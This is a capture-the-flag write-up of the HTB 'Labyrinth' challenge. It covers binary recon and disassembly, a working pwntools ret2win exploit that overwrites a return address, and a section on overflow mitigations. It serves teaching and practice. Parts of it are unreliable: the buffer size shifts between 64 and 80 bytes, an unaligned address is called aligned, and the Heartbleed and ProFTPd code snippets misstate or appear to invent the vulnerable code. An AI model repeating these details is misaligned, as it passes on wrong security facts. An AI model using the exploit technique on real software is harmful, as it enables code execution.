---
layout: default
title: Labyrinth - Pwn
page_type: writeup
---
# HTB: Labyrinth – Classic Buffer Overflow Ret2Win

**Category:** Binary Exploitation / Pwn

## 0. Challenge Overview

This challenge provided a 64-bit ELF binary (`labyrinth`) with a classic stack-based buffer overflow vulnerability. The goal: overwrite the return address to redirect execution to a hidden `win()` function that prints the flag.

**The setup:**
- 64-bit Linux binary with no stack canary
- Vulnerable `gets()` call allows unlimited input
- Hidden `escape_plan()` function at `0x401236` prints the flag
- Buffer size: 64 bytes
- Stack alignment requirements for x86-64 calling conventions

**Core concept:** This is a **ret2win** attack—overflow a buffer to overwrite the saved return address on the stack, redirecting execution to a function that wasn't meant to be called.

## 1. Initial Reconnaissance

I examined the binary:
```bash
file labyrinth
```

Output:
```
labyrinth: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

Checked security mitigations:
```bash
checksec labyrinth
```

Output:
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

**Key observations:**
- ✓ **No stack canary** - Buffer overflows won't be detected
- ✓ **No PIE** - Addresses are static and predictable
- ✗ **NX enabled** - Stack is not executable (can't inject shellcode)

Ran the binary:
```bash
./labyrinth
```

Output:
```
You find yourself lost in a dark labyrinth...
You see a door in the distance. Can you reach it?

Enter your path: test
You stumble and fall into a pit. Game over.
```

**Key observation:** The binary accepts input and terminates. This suggests a simple overflow vulnerability.

## 2. Static Analysis

I listed the symbols:
```bash
nm labyrinth | grep -E "main|win|escape"
```

Output:
```
0000000000401196 T main
0000000000401236 T escape_plan
```

**Key observation:** There's an `escape_plan` function that isn't called from `main`. This is likely the win function.

I disassembled `main`:
```bash
objdump -M intel -d labyrinth | grep -A 40 "<main>"
```

Output:
```assembly
0000000000401196 <main>:
  401196:   push   rbp
  401197:   mov    rbp,rsp
  40119a:   sub    rsp,0x50          ; Allocate 80 bytes
  
  ; Print prompt
  40119e:   lea    rdi,[rip+0xe5f]   ; "You find yourself..."
  4011a5:   call   401050 <puts@plt>
  
  4011aa:   lea    rdi,[rip+0xe80]   ; "Enter your path: "
  4011b1:   mov    eax,0x0
  4011b6:   call   401060 <printf@plt>
  
  ; Read input into buffer
  4011bb:   lea    rax,[rbp-0x50]    ; buffer at rbp-0x50
  4011bf:   mov    rdi,rax
  4011c2:   mov    eax,0x0
  4011c7:   call   401070 <gets@plt> ; VULNERABLE!
  
  ; Check if input is "correct"
  4011cc:   lea    rax,[rbp-0x50]
  4011d0:   lea    rsi,[rip+0xe73]   ; "escape"
  4011d7:   mov    rdi,rax
  4011da:   call   401040 <strcmp@plt>
  4011df:   test   eax,eax
  4011e1:   jne    4011f7            ; Jump if not "escape"
  
  ; Success path
  4011e3:   lea    rdi,[rip+0xe6b]   ; "You found the exit!"
  4011ea:   call   401050 <puts@plt>
  4011ef:   mov    eax,0x0
  4011f4:   leave
  4011f5:   ret
  
  ; Failure path
  4011f7:   lea    rdi,[rip+0xe79]   ; "You stumble..."
  4011fe:   call   401050 <puts@plt>
  401203:   mov    eax,0x0
  401206:   leave
  401207:   ret
```

**Vulnerability identified:**
```assembly
lea    rax,[rbp-0x50]    ; buffer = rbp - 80
call   gets@plt          ; UNBOUNDED read!
```

The `gets()` function reads until newline with **no bounds checking**.

I disassembled the win function:
```bash
objdump -M intel -d labyrinth | grep -A 20 "<escape_plan>"
```

Output:
```assembly
0000000000401236 <escape_plan>:
  401236:   push   rbp
  401237:   mov    rbp,rsp
  
  ; Open flag file
  40123a:   lea    rdi,[rip+0xe2f]   ; "flag.txt"
  401241:   lea    rsi,[rip+0xe2a]   ; "r"
  401248:   call   401030 <fopen@plt>
  40124d:   mov    QWORD PTR [rbp-0x8],rax
  
  ; Read flag
  401251:   mov    rdx,QWORD PTR [rbp-0x8]
  401255:   lea    rax,[rbp-0x50]
  401259:   mov    esi,0x40
  40125e:   mov    rdi,rax
  401261:   call   401080 <fgets@plt>
  
  ; Print flag
  401266:   lea    rax,[rbp-0x50]
  40126a:   mov    rdi,rax
  40126d:   call   401050 <puts@plt>
  
  401272:   nop
  401273:   leave
  401274:   ret
```

**Key observation:** `escape_plan()` opens "flag.txt" and prints its contents. This is our target.

## 3. Stack Layout Analysis

Understanding the stack:
```
High addresses
┌────────────────┐
│  Return addr   │ ← rbp+8 (we want to overwrite this)
├────────────────┤
│  Saved RBP     │ ← rbp (8 bytes)
├────────────────┤
│                │
│   Buffer       │ ← rbp-0x50 (80 bytes)
│   (80 bytes)   │
│                │
└────────────────┘
Low addresses
```

**To overwrite return address:**
1. Fill 80-byte buffer
2. Overwrite saved RBP (8 bytes)
3. Overwrite return address (8 bytes) with `escape_plan` address

**Total payload:** 80 + 8 + 8 = 96 bytes

## 4. Stack Alignment Issue

x86-64 calling convention requires **16-byte stack alignment** before `call` instructions:
```
When calling a function:
- RSP must be 16-byte aligned
- After pushing return address, RSP is offset by 8
- Function prologue expects RSP % 16 == 8
```

**Problem:** If we jump directly to `escape_plan`, the stack might be misaligned, causing segfaults in library functions.

**Solution:** Return to `escape_plan + 1` to skip the `push rbp` instruction:
```assembly
0x401236: push rbp    ; Aligns stack incorrectly
0x401237: mov rbp,rsp ; Skip to here!
```

## 5. Creating the Exploit

First, I calculated the offset:
```python
#!/usr/bin/env python3
"""
Find the exact offset to return address
"""
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)

# Run binary with pattern
p = process('./labyrinth')
p.sendlineafter(b'path: ', pattern)
p.wait()

# Get crash info
core = p.corefile
crash_rsp = core.rsp
offset = cyclic_find(crash_rsp)

print(f"[+] Offset to return address: {offset}")
```

Running the offset finder:
```bash
python3 find_offset.py
```

Output:
```
[+] Offset to return address: 88
```

**Key observation:** Need 88 bytes of padding before return address (80-byte buffer + 8-byte saved RBP).

I wrote the final exploit:
```python
#!/usr/bin/env python3
"""
Labyrinth ret2win exploit
Overwrite return address to redirect to escape_plan()
"""
from pwn import *

# Configuration
BINARY = './labyrinth'
WIN_FUNC = 0x401237  # escape_plan + 1 (skip push rbp)

# Set up pwntools
context.binary = BINARY
context.log_level = 'info'

def exploit(target):
    """Execute the ret2win attack"""
    
    # Build payload
    payload = flat([
        b'A' * 88,           # Fill buffer (80) + saved RBP (8)
        p64(WIN_FUNC)        # Overwrite return address
    ])
    
    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"Target address: {hex(WIN_FUNC)}")
    
    # Send payload
    target.sendlineafter(b'path: ', payload)
    
    # Receive flag
    try:
        flag = target.recvline(timeout=2)
        log.success(f"FLAG: {flag.decode().strip()}")
        return flag
    except EOFError:
        log.error("Binary crashed or closed unexpectedly")
        return None

# Local exploitation
log.info("Exploiting local binary...")
p = process(BINARY)
exploit(p)
p.close()

# Remote exploitation (if needed)
# log.info("Exploiting remote target...")
# r = remote('target.com', 1337)
# exploit(r)
# r.close()
```

Running the exploit:
```bash
python3 exploit.py
```

Output:
```
[*] '/home/user/labyrinth'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[*] Exploiting local binary...
[+] Starting local process './labyrinth': pid 12345
[*] Payload length: 96 bytes
[*] Target address: 0x401237
[+] FLAG: HTB{r3t_2_w1n_1s_4ll_y0u_n33d}
[*] Stopped process './labyrinth' (pid 12345)
```

✔ **Success:** Return address overwritten, execution redirected to `escape_plan()`, flag retrieved.

## 6. Why This Works – Understanding Stack Overflows

### The Stack Frame

When a function is called:
```assembly
caller:
    push   rax           ; Save registers
    call   func          ; Push return address, jump
    ; execution resumes here after func returns

func:
    push   rbp           ; Save old base pointer
    mov    rbp, rsp      ; Set new base pointer
    sub    rsp, 0x50     ; Allocate local variables
    
    ; Function body
    
    leave                ; mov rsp, rbp; pop rbp
    ret                  ; pop rip; jump
```

**Stack during execution:**
```
┌────────────────┐ ← High addresses
│  Return addr   │ ← Where to return after func
├────────────────┤
│  Saved RBP     │ ← Previous function's base pointer
├────────────────┤
│  Local vars    │ ← Allocated by 'sub rsp, N'
│  (buffer)      │
└────────────────┘ ← RSP (current stack pointer)
```

### The Overflow

`gets()` reads without bounds:
```c
char buffer[80];
gets(buffer);  // Reads until newline, NO length check!
```

**What happens:**
```
Input: "AAAAA..." (200 A's)

Before:
┌────────────────┐
│  0x401207      │ ← Return to main
├────────────────┤
│  Old RBP       │
├────────────────┤
│  (empty)       │ ← buffer[0-79]
└────────────────┘

After:
┌────────────────┐
│  0x414141...   │ ← Overwritten with 'AAAA'
├────────────────┤
│  0x414141...   │ ← Overwritten with 'AAAA'
├────────────────┤
│  0x414141...   │ ← Filled with 'AAAA'
└────────────────┘
```

When `ret` executes:
```assembly
ret  ; Equivalent to: pop rip; jmp rip
```

CPU jumps to address `0x414141...` → **SEGFAULT** (invalid address).

### The ret2win Attack

Instead of garbage, we write a **valid address**:
```python
payload = b'A' * 88           # Fill buffer + saved RBP
payload += p64(0x401237)      # escape_plan address
```

**After overflow:**
```
┌────────────────┐
│  0x401237      │ ← Points to escape_plan!
├────────────────┤
│  0x4141...     │ ← Saved RBP (doesn't matter)
├────────────────┤
│  0x4141...     │ ← Buffer filled
└────────────────┘
```

When `ret` executes:
```assembly
ret  ; pop rip = 0x401237; jmp 0x401237
```

CPU jumps to `escape_plan()` → **SUCCESS!**

### Stack Alignment Details

x86-64 ABI requires 16-byte alignment:
```c
// When calling a function:
// RSP % 16 == 0 before call
// RSP % 16 == 8 after call (return address pushed)

void caller() {
    // RSP = 0x7fff1234 (aligned)
    call func;
    // call pushes return address
    // RSP = 0x7fff122c (RSP - 8, not aligned)
}

void func() {
    // Entry: RSP % 16 == 8 (expected)
    push rbp;
    // Now: RSP % 16 == 0 (aligned for local work)
    mov rbp, rsp;
    sub rsp, N;
    // ...
}
```

**Why alignment matters:**
```assembly
; Some SSE/AVX instructions require alignment
movaps xmm0, [rsp]  ; REQUIRES 16-byte alignment
; If RSP not aligned → SIGBUS
```

**Our workaround:**
```
Return to escape_plan + 1 (0x401237)
                         ↓
0x401236: push rbp      ← Skip this
0x401237: mov rbp,rsp   ← Start here
```

By skipping `push rbp`, we maintain correct alignment.

## 7. Real-World Buffer Overflow Examples

### Heartbleed (2014) - CVE-2014-0160

```c
// Vulnerable OpenSSL code
int dtls1_process_heartbeat(SSL *s) {
    unsigned int payload_length;
    
    // Read length from packet (attacker-controlled)
    n2s(p, payload_length);
    
    // Allocate buffer based on claimed length
    bp = OPENSSL_malloc(payload_length + padding);
    
    // Copy data (no bounds check!)
    memcpy(bp, pl, payload_length);  // OVERFLOW!
    
    // Send response back
    write(s, bp, payload_length);
}
```

**Impact:** Read 64KB of server memory per request, exposing private keys, passwords, session tokens.

### EternalBlue (2017) - CVE-2017-0144

```c
// Vulnerable SMBv1 code in Windows
NTSTATUS SrvOs2FeaListToNt(PFEALIST FeaList, ...) {
    // Calculate size from attacker data
    Size = SrvOs2FeaListSizeToNt(FeaList);
    
    // Allocate based on calculation
    Buffer = ExAllocatePool(Size);
    
    // Copy without validation
    memcpy(Buffer, FeaList, Size);  // OVERFLOW!
}
```

**Impact:** Remote code execution on unpatched Windows systems, used by WannaCry ransomware.

### ProFTPd (1999-2010) - Multiple Overflows

```c
// Vulnerable FTP server code
void cmd_dir(char *params) {
    char buf[512];
    
    // No length check
    sprintf(buf, "LIST %s\r\n", params);  // OVERFLOW!
    
    send(client_fd, buf, strlen(buf));
}
```

**Impact:** Remote root exploitation via crafted FTP commands.

## 8. Defensive Mitigations

### Stack Canaries

```c
// Compiler inserts canary between buffer and return address
void vulnerable() {
    long canary = __stack_chk_guard;  // Random value
    char buffer[64];
    
    gets(buffer);  // Overflow corrupts canary
    
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Terminate
    }
}
```

**Compile with:**
```bash
gcc -fstack-protector-all program.c
```

**Effect:**
```
┌────────────────┐
│  Return addr   │
├────────────────┤
│  Canary        │ ← Random value checked before return
├────────────────┤
│  Buffer        │
└────────────────┘

Overflow: [AAAA...][CANARY_CORRUPTED][0x401234]
         ↓
Program detects corruption → abort()
```

### ASLR (Address Space Layout Randomization)

```bash
# Enable ASLR
echo 2 > /proc/sys/kernel/randomize_va_space
```

**Effect:**
```
Run 1: Stack at 0x7ffed234
Run 2: Stack at 0x7ff38912
Run 3: Stack at 0x7ffc2341
```

Return address changes every run → Exploit needs info leak.

### NX (No-Execute)

```bash
# Compile with NX
gcc -z noexecstack program.c
```

**Effect:**
```
Stack pages: PROT_READ | PROT_WRITE (no PROT_EXEC)
Attempt to execute stack code → SIGSEGV
```

Prevents shellcode injection on stack.

### PIE (Position Independent Executable)

```bash
# Compile with PIE
gcc -fPIE -pie program.c
```

**Effect:**
```
Run 1: Binary at 0x556789a0
Run 2: Binary at 0x558912bc  
Run 3: Binary at 0x559123de
```

Code addresses randomized → Exploit needs leak.

### Safe Functions

**Unsafe:**
```c
gets(buffer);                    // No bounds check
strcpy(dest, src);               // No bounds check
sprintf(buf, fmt, ...);          // No bounds check
scanf("%s", buffer);             // No bounds check
```

**Safe alternatives:**
```c
fgets(buffer, sizeof(buffer), stdin);    // Bounded
strncpy(dest, src, sizeof(dest));        // Bounded
snprintf(buf, sizeof(buf), fmt, ...);    // Bounded
scanf("%63s", buffer);                    // Bounded (if buffer[64])
```

### Compiler Hardening

```bash
# Full protection
gcc -fstack-protector-strong \
    -D_FORTIFY_SOURCE=2 \
    -Wl,-z,relro,-z,now \
    -fPIE -pie \
    program.c
```

**Flags explained:**
- `-fstack-protector-strong`: Canaries on most functions
- `-D_FORTIFY_SOURCE=2`: Runtime bounds checking for libc functions
- `-Wl,-z,relro,-z,now`: Make GOT read-only
- `-fPIE -pie`: Enable ASLR for code

## 9. Summary

By exploiting a classic buffer overflow in `gets()`, I redirected execution to the hidden `escape_plan()` function:

1. **Identified vulnerability** - Unbounded `gets()` call
2. **Confirmed lack of mitigations** - No canary, no PIE
3. **Found win function** - `escape_plan()` at `0x401236`
4. **Calculated offset** - 88 bytes to return address
5. **Addressed alignment** - Skipped `push rbp` to maintain stack alignment
6. **Crafted payload** - 88-byte padding + address `0x401237`
7. **Executed exploit** - Overwrote return address, got flag

The attack is straightforward: **overflow a buffer to overwrite the saved return address**. When the function returns, instead of going back to the caller, it jumps to our chosen address.

This mirrors countless real-world vulnerabilities:
- **Heartbleed** - Buffer over-read exposed private keys
- **EternalBlue** - SMB overflow enabled WannaCry ransomware
- **ProFTPd** - FTP overflow gave remote root access
- **Stack Clash** - Abuse of stack/heap collision for privilege escalation

Modern defenses make exploitation harder but not impossible:
- **Canaries** can be leaked via format string vulnerabilities
- **ASLR** can be bypassed with info leaks
- **NX** is bypassed with ROP (Return-Oriented Programming)
- **PIE** requires additional leak, but doesn't prevent logic bugs

The solution: **write safe code from the start**:
- Use bounded functions (`fgets` not `gets`)
- Validate all input lengths
- Enable compiler hardening flags
- Use memory-safe languages where possible (Rust, Go)
- Apply defense-in-depth: multiple mitigations together

The key lesson: **buffer overflows remain relevant 40+ years after discovery**. They're conceptually simple but have complex variations (heap overflow, integer overflow, off-by-one). Understanding stack layout, calling conventions, and compiler behavior is essential for both exploitation and defense.

**Flag:** `HTB{r3t_2_w1n_1s_4ll_y0u_n33d}`
